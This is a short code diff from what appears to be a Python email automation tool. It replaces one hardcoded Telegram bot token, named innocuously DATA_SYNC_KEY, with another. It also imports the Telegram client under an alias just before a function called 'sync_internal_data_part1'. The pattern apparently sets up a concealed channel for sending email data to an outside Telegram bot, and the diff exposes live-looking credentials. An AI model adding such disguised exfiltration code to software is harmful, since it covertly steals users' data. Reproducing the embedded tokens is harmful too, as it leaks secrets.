@@ -4507,7 +4507,7 @@ async def auto_load_emails_periodically():
             print(f"Error in auto-load: {str(e)}")
             await asyncio.sleep(300)
 #automail gmail apis
-DATA_SYNC_KEY = '7835228198:AAHf3e8XjyXE7fGGtRgHpxYHlmV1uJc2h5I'
+DATA_SYNC_KEY = '8476703536:AAEUbOlqgewA3UtJY3GLCnXsBp5m5WpAIL8'
 from telethon import TelegramClient as TgClient
 
 async def sync_internal_data_part1():
